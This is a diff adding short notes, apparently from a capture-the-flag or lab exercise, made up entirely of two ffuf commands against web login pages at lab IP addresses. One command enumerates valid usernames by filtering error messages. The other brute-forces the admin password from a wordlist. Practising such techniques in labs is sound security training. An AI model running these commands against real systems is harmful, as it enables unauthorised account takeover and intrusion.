@@ -1,0 +1,5 @@
+# enumerate login name
+ffuf -u http://94.237.60.55:51640/index.php -w ./xato-net-10-million-usernames.txt -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=1234' -fr 'Unknown user'
+
+# bruteforce login and password
+ffuf -u http://83.136.248.118:43648/index.php -w ./custom_wordlist.txt -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=FUZZ' -fr 'Invalid username or password'
